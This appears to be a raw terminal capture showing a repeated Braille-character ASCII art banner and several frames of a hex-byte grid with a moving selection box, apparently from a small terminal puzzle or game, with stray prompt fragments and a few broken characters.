⠀⠐⠛⢿⣿⣿⣿⠾⠿⠿⠿⠿⠿⠿⠿⠖⠓⠛⠛⠛⠛⠛⠛⠉⠉⠉⠀⠀⣀⣘⠟⠃⠠⠾⡟⢃⠤⠶⠿⠋⠁⠀⠐⠁⠀⣠⢤⡴⢆⡐⠶⠀⢠⣿⠛⠙⠛⢿⣿⣿⣖⣦⣄⣀⠀⠀⢀⣤⣶⣿⣿⠿⠟⠋⠉⠉⠀⠀⠀⢠⣻⠃⠀⣀⣶⣾⡿⠀⣐⣛⠋⠀⣻⣶⣾⠛⠀⢸⣿⠏⠀⠈⠛⠻⣿⠗⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠋⠀⠼⠿⠿⠛⠉⠉⠁⠀⠀⠀⠀⠙⠛⠉⠀⠀⠀⠀⠀⠀⣠⣿⠏⠀⠀⠀⠀⠀⠉⠛⠛⠿⢿⣿⠗⠀⢸⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠔⠋⠀⡛⡟⠀⠐⠛⠃⠀⠀⠘⠛⠃⠀⠀⠤⠋⠀⠀⠀⠀⠀⠀⠈⠒⠢⡀⠀⠀⠀⠀⠀�\xa0\x80⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣿⠋⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠒⠄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                               [ 44  7F  44  55  0B  7F  FE  F8 ]
                                                                ┌─┴─┐          
                                                             7F │   │  7F   55 
                                                                └─┬─┘          
                                                                  │            
                                                             0B   5A   7E   0A 
                                                                  │            
                                                                  │            
                                                                  10        55 
                                                                  │            
                                                                  │            
                                                   13   10        FE        44 
                                                                  │            
                                                                  │            
                                                   7F   0A   FE   F8           
                                                                  │            
                                                                  │            
                                                             13   0B           
                                                                  │            
                                                            $> $ s
$  
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣿⣿⠿⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠴⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⣶⡿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⣀⣀⡀⠀⣠⣾⡿⠋⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣤⡄⠀⠀⢀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡄⠀⠀⠀⢀⣀⣤⡶⠊⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣴⣾⡿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⢀⣤⣾⡿⠋⢀⣴⣿⠛⠛⠛⢻⣿⣿⢧⣴⣿⠛⠛⠛⠀⠀⠀⠀⣸⡿⠉⠉⠉⠉⠉⠉⣉⣹⣿⣿⡿⠧⠀⠀⢠⣿⡟⠛⠛⠛⠛⠛⠛⠉⣉⣭⣿⡿⠟⠃⠀⣠⡾⠃⢠⣾⡄⠀⠀⠀⣾⡟⠀⣠⣿⡟⠀⣠⣤⡶⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣀⣀⣠⣄⣍⣉⣉⣁⣄⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣴⣿⣦⡀⠙⠷⠶⣟⣛⠛⠀⣐⣛⠛⠁⢀⣀⣚⠛⠋⢁⠺⠿⠟⠛⠛⠛⠉⠁⠀⣠⣿⣷⣤⣤⣶⣾⠿⠟⠛⠉⠁⠀⠀⠀⠀⣠⣿⠿⠀⣀⣀⣤⣴⡾⠿⠛⢉⣩⠀⠀⠀⢀⣴⡿⠃⢠⣿⣿⣿⠀⢀⣾⠏⠀⣀⣉⡹⡻⣿⣯⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠐⠛⢿⣿⣿⣿⠾⠿⠿⠿⠿⠿⠿⠿⠖⠓⠛⠛⠛⠛⠛⠛⠉⠉⠉⠀⠀⣀⣘⠟⠃⠠⠾⡟⢃⠤⠶⠿⠋⠁⠀⠐⠁⠀⣠⢤⡴⢆⡐⠶⠀⢠⣿⠛⠙⠛⢿⣿⣿⣖⣦⣄⣀⠀⠀⢀⣤⣶⣿⣿⠿⠟⠋⠉⠉⠀⠀⠀⢠⣻⠃⠀⣀⣶⣾⡿⠀⣐⣛⠋⠀⣻⣶⣾⠛⠀⢸⣿⠏⠀⠈⠛⠻⣿⠗⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠋⠀⠼⠿⠿⠛⠉⠉⠁⠀⠀⠀⠀⠙⠛⠉⠀⠀⠀⠀⠀⠀⣠⣿⠏⠀⠀⠀⠀⠀⠉⠛⠛⠿⢿⣿⠗⠀⢸⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠔⠋⠀⡛⡟⠀⠐⠛⠃⠀⠀⠘⠛⠃⠀⠀⠤⠋⠀⠀⠀⠀⠀⠀⠈⠒⠢⡀⠀⠀⠀⠀⠀�\xa0\x80⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣿⠋⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠒⠄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                               [ 44  7F  44  55  0B  7F  FE  F8 ]
                                                                  │            
                                                             7F   │    7F   55 
                                                                  │            
                                                                ┌─┴─┐          
                                                             0B │#5A│  7E   0A 
                                                                └─┬─┘          
                                                                  │            
                                                                  10        55 
                                                                  │            
                                                                  │            
                                                   13   10        FE        44 
                                                                  │            
                                                                  │            
                                $ s
                   7F   0A   FE   F8           
                                                                  │            
                                                                  │            
                                                             13   0B           
                                                                  │            
                                                            $> $  
...

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣿⣿⠿⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠴⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⣶⡿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⣀⣀⡀⠀⣠⣾⡿⠋⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣤⡄⠀⠀⢀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡄⠀⠀⠀⢀⣀⣤⡶⠊⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣴⣾⡿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⢀⣤⣾⡿⠋⢀⣴⣿⠛⠛⠛⢻⣿⣿⢧⣴⣿⠛⠛⠛⠀⠀⠀⠀⣸⡿⠉⠉⠉⠉⠉⠉⣉⣹⣿⣿⡿⠧⠀⠀⢠⣿⡟⠛⠛⠛⠛⠛⠛⠉⣉⣭⣿⡿⠟⠃⠀⣠⡾⠃⢠⣾⡄⠀⠀⠀⣾⡟⠀⣠⣿⡟⠀⣠⣤⡶⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣀⣀⣠⣄⣍⣉⣉⣁⣄⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣴⣿⣦⡀⠙⠷⠶⣟⣛⠛⠀⣐⣛⠛⠁⢀⣀⣚⠛⠋⢁⠺⠿⠟⠛⠛⠛⠉⠁⠀⣠⣿⣷⣤⣤⣶⣾⠿⠟⠛⠉⠁⠀⠀⠀⠀⣠⣿⠿⠀⣀⣀⣤⣴⡾⠿⠛⢉⣩⠀⠀⠀⢀⣴⡿⠃⢠⣿⣿⣿⠀⢀⣾⠏⠀⣀⣉⡹⡻⣿⣯⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠐⠛⢿⣿⣿⣿⠾⠿⠿⠿⠿⠿⠿⠿⠖⠓⠛⠛⠛⠛⠛⠛⠉⠉⠉⠀⠀⣀⣘⠟⠃⠠⠾⡟⢃⠤⠶⠿⠋⠁⠀⠐⠁⠀⣠⢤⡴⢆⡐⠶⠀⢠⣿⠛⠙⠛⢿⣿⣿⣖⣦⣄⣀⠀⠀⢀⣤⣶⣿⣿⠿⠟⠋⠉⠉⠀⠀⠀⢠⣻⠃⠀⣀⣶⣾⡿⠀⣐⣛⠋⠀⣻⣶⣾⠛⠀⢸⣿⠏⠀⠈⠛⠻⣿⠗⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠋⠀⠼⠿⠿⠛⠉⠉⠁⠀⠀⠀⠀⠙⠛⠉⠀⠀⠀⠀⠀⠀⣠⣿⠏⠀⠀⠀⠀⠀⠉⠛⠛⠿⢿⣿⠗⠀⢸⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠔⠋⠀⡛⡟⠀⠐⠛⠃⠀⠀⠘⠛⠃⠀⠀⠤⠋⠀⠀⠀⠀⠀⠀⠈⠒⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣿⠋⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠒⠄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀�\xa0\x80⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                               [ 44  7F  44  55  0B  7F  FE  F8 ]
                                                                  │            
                                                             7F   │    7F   55 
                                                                  │            
                                                                  │            
                                                             0B   5A   7E   0A 
                                                                  │            
                                                                  │            
                                                                  10        55 
                                                                  │            
                                                                  │            
                                                   13   10        FE        44 
                                                                  │            
                                                                  │            
                                                   7F   0A   FE   F8           
                                                                  │            
                                                                ┌─┴─┐          
                                                             13 │#0B│          
                                                                └─┬─┘          
                                                            $> $  
$  
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣿⣿⠿⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠴⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⣶⡿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⣀⣀⡀⠀⣠⣾⡿⠋⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣤⡄⠀⠀⢀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡄⠀⠀⠀⢀⣀⣤⡶⠊⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣴⣾⡿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⢀⣤⣾⡿⠋⢀⣴⣿⠛⠛⠛⢻⣿⣿⢧⣴⣿⠛⠛⠛⠀⠀⠀⠀⣸⡿⠉⠉⠉⠉⠉⠉⣉⣹⣿⣿⡿⠧⠀⠀⢠⣿⡟⠛⠛⠛⠛⠛⠛⠉⣉⣭⣿⡿⠟⠃⠀⣠⡾⠃⢠⣾⡄⠀⠀⠀⣾⡟⠀⣠⣿⡟⠀⣠⣤⡶⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣀⣀⣠⣄⣍⣉⣉⣁⣄⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣴⣿⣦⡀⠙⠷⠶⣟⣛⠛⠀⣐⣛⠛⠁⢀⣀⣚⠛⠋⢁⠺⠿⠟⠛⠛⠛⠉⠁⠀⣠⣿⣷⣤⣤⣶⣾⠿⠟⠛⠉⠁⠀⠀⠀⠀⣠⣿⠿⠀⣀⣀⣤⣴⡾⠿⠛⢉⣩⠀⠀⠀⢀⣴⡿⠃⢠⣿⣿⣿⠀⢀⣾⠏⠀⣀⣉⡹⡻⣿⣯⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠐⠛⢿⣿⣿⣿⠾⠿⠿⠿⠿⠿⠿⠿⠖⠓⠛⠛⠛⠛⠛⠛⠉⠉⠉⠀⠀⣀⣘⠟⠃⠠⠾⡟⢃⠤⠶⠿⠋⠁⠀⠐⠁⠀⣠⢤⡴⢆⡐⠶⠀⢠⣿⠛⠙⠛⢿⣿⣿⣖⣦⣄⣀⠀⠀⢀⣤⣶⣿⣿⠿⠟⠋⠉⠉⠀⠀⠀⢠⣻⠃⠀⣀⣶⣾⡿⠀⣐⣛⠋⠀⣻⣶⣾⠛⠀⢸⣿⠏⠀⠈⠛⠻⣿⠗⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠋⠀⠼⠿⠿⠛⠉⠉⠁⠀⠀⠀⠀⠙⠛⠉⠀⠀⠀⠀⠀⠀⣠⣿⠏⠀⠀⠀⠀⠀⠉⠛⠛⠿⢿⣿⠗⠀⢸⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠔⠋⠀⡛⡟⠀⠐⠛⠃⠀⠀⠘⠛⠃⠀⠀⠤⠋⠀⠀⠀⠀⠀⠀⠈⠒⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣿⠋⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠄⡀⠀⠀⠀⠀⠀⠀⠀
